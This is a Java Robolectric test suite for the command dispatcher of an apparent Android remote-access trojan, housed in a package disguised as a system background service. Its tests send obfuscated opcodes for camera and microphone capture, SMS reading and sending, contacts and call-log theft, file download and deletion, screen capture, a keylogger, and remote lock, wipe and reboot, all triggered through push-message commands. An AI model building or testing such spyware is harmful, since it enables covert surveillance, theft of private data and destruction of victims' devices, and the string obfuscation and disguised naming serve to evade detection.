package com.android.background.services;

import org.json.JSONObject;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.robolectric.RobolectricTestRunner;
import org.robolectric.RuntimeEnvironment;
import org.robolectric.annotation.Config;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import static org.junit.Assert.*;

/**
 * Robolectric tests for ConnectionManager opcode dispatch.
 *
 * Tests the dispatchOrder routing logic by invoking it via reflection
 * and verifying it handles all opcodes, edge cases, and malformed input
 * without crashing.
 *
 * The handler methods (x0000ca, x0000fm, etc.) talk to hardware/system
 * services and are tested indirectly through graceful error handling
 * when those services are unavailable in the Robolectric environment.
 */
@RunWith(RobolectricTestRunner.class)
@Config(sdk = 34, manifest = Config.NONE)
public class ConnectionManagerTest {

    @Before
    public void setUp() {
        // Initialize with Robolectric context so handlers don't NPE
        ConnectionManager.context = RuntimeEnvironment.getApplication();
    }

    // ================================================================
    // Helper: invoke dispatchOrder via reflection
    // ================================================================

    private void dispatchOrder(JSONObject data) throws Exception {
        Method method = ConnectionManager.class.getDeclaredMethod("dispatchOrder", JSONObject.class);
        method.setAccessible(true);
        method.invoke(null, data);
    }

    private void dispatchOrderSafe(JSONObject data) {
        try {
            dispatchOrder(data);
        } catch (Exception e) {
            fail("dispatchOrder threw: " + e.getCause() != null ? e.getCause().getMessage() : e.getMessage());
        }
    }

    // ================================================================
    // dispatchOrder — null / empty / unknown
    // ================================================================

    @Test
    public void dispatchOrder_null_doesNotThrow() {
        try {
            dispatchOrder(null);
        } catch (InvocationTargetException e) {
            // Null data should throw NPE inside dispatch; that's acceptable
            assertTrue(e.getCause() instanceof NullPointerException);
        } catch (Exception e) {
            fail("Unexpected exception: " + e.getMessage());
        }
    }

    @Test
    public void dispatchOrder_emptyOrder_doesNotThrow() {
        JSONObject data = new JSONObject();
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_unknownOrder_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put("order", "some_garbage_opcode");
        } catch (Exception e) {
            fail("Failed to put order: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_emptyStringOrder_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put("order", "");
        } catch (Exception e) {
            fail("Failed to put order: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Camera (x0000ca)
    // ================================================================

    @Test
    public void dispatchOrder_cameraCamList_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CA));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_CAMLIST));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_cameraFront_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CA));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA), "1");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_cameraBack_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CA));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA), "0");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — File Manager (x0000fm)
    // ================================================================

    @Test
    public void dispatchOrder_fileList_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000FM));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_LS));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_PATH), "/");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_fileDownload_missingPath_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000FM));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_DL));
            // Intentionally missing PATH field
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — SMS (x0000sm)
    // ================================================================

    @Test
    public void dispatchOrder_smsList_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000SM));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_LS));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_smsSend_missingFields_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000SM));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_SENDSMS));
            // Intentionally missing TO and SMS fields
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Calls / Contacts / Apps / Location
    // ================================================================

    @Test
    public void dispatchOrder_callLogs_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CL));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_contacts_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CN));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_installedApps_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000APPS));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Mic (x0000mc) with missing/invalid sec param
    // ================================================================

    @Test
    public void dispatchOrder_mic_defaultSeconds_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000MC));
            // Intentionally missing SEC field — should default to 10
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Open URL / Run App / Delete File
    // ================================================================

    @Test
    public void dispatchOrder_openUrl_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000OPENURL));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_URL), "https://example.com");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_openUrl_missingUrl_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000OPENURL));
            // Intentionally missing URL field
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_runApp_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000RUNAPP));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA), "com.example.app");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_deleteFile_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000DELETEFF));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_FILEFOLDERPATH), "/tmp/test");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Device Admin (lock/wipe/reboot)
    // ================================================================

    @Test
    public void dispatchOrder_lockDevice_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000LOCKDEVICE));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_wipeDevice_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000WIPEDEVICE));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_rebootDevice_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000REBOOTDEVICE));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Screen Capture (x0000sc)
    // ================================================================

    @Test
    public void dispatchOrder_screenCapture_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000SC));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Keylogger (x0000kl)
    // ================================================================

    @Test
    public void dispatchOrder_keyloggerToggle_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ACTION), "toggle");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    @Test
    public void dispatchOrder_keyloggerGetStatus_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL));
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ACTION), "getStatus");
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        dispatchOrderSafe(data);
    }

    // ================================================================
    // dispatchOrder — Multiple opcodes in sequence
    // ================================================================

    @Test
    public void dispatchOrder_allOpcodes_doNotThrow() {
        // Test that a sequence of valid dispatches doesn't corrupt internal state
        String[][] testCases = {
            {ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CL), null},
            {ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CN), null},
            {ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000APPS), null},
            {ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000LOCKDEVICE), null},
            {ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000WIPEDEVICE), null},
        };

        for (String[] tc : testCases) {
            JSONObject data = new JSONObject();
            try {
                data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER), tc[0]);
            } catch (Exception e) {
                fail("Test setup failed for " + tc[0] + ": " + e.getMessage());
            }
            dispatchOrderSafe(data);
        }
    }

    // ================================================================
    // executeFcmCommand — public entry point
    // ================================================================

    @Test
    public void executeFcmCommand_nullContext_doesNotThrow() {
        JSONObject data = new JSONObject();
        try {
            data.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER),
                    ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CL));
        } catch (Exception e) {
            fail("Test setup failed: " + e.getMessage());
        }
        // With null context, it should handle gracefully
        try {
            ConnectionManager.executeFcmCommand(null, data);
        } catch (Exception e) {
            // Exception from null context is acceptable — not a crash
        }
    }

    @Test
    public void executeFcmCommand_nullData_doesNotThrow() {
        try {
            ConnectionManager.executeFcmCommand(RuntimeEnvironment.getApplication(), null);
        } catch (Exception e) {
            // Exception from null data is acceptable — not a crash
        }
    }
}
